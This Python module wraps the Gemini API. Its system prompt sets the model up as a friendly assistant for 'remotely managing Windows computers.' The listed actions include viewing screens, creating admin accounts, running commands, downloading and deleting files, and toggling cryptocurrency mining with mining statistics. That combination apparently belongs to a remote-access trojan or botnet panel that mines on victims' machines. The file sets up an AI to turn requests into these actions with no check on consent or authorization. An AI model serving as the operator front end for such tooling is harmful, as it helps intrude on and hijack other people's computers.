import json
import aiohttp
from typing import Optional, Dict, Any
from utils.config import load_config


class GeminiClient:
    def __init__(self):
        self.config = load_config()
        self.api_key = self.config.get("gemini_api_key", "")
        self.base_url = "https://generativelanguage.googleapis.com/v1beta/models"
        self.model = "gemini-2.0-flash-lite"

    async def chat(self, message: str, context: str = "") -> str:
        if not self.api_key:
            return "Error: Gemini API key not configured. Please set it in Settings."

        try:
            session = aiohttp.ClientSession()
            prompt = self._build_prompt(message, context)

            async with session.post(
                f"{self.base_url}/{self.model}:generateContent?key={self.api_key}",
                json={"contents": [{"parts": [{"text": prompt}]}]},
                headers={"Content-Type": "application/json"}
            ) as resp:
                if resp.status == 429:
                    return "Rate limited. Please wait a moment and try again."
                if resp.status != 200:
                    return f"API error: {resp.status}"

                data = await resp.json()
                await session.close()

                if "candidates" in data and data["candidates"]:
                    return data["candidates"][0]["content"]["parts"][0]["text"]
                return "No response from AI."

        except Exception as e:
            return f"Error: {str(e)}"

    def _build_prompt(self, message: str, context: str) -> str:
        system_prompt = """You are a helpful assistant for managing Windows computers remotely.

You can help with these commands:
- view_screen <device_name>: View a device's screen
- create_admin <device_name> [username] [password]: Create admin account
- run_command <device_name> <command>: Run a command on a device
- list_devices: Show all connected devices
- browse_files <device_name> [path]: Browse files on a device
- download_file <device_name> <path>: Download a file
- delete_file <device_name> <path>: Delete a file
- toggle_mining <device_name> on/off: Toggle mining
- mining_stats <device_name>: Show mining statistics

When the user asks to do something, respond with a JSON object like:
{"action": "command_name", "params": {"param1": "value1"}}

If you need more information, ask the user.
If the request is unclear, ask for clarification.
Always respond in a helpful, friendly way."""

        if context:
            system_prompt += f"\n\nCurrent devices:\n{context}"

        return f"{system_prompt}\n\nUser: {message}"


gemini_client = GeminiClient()
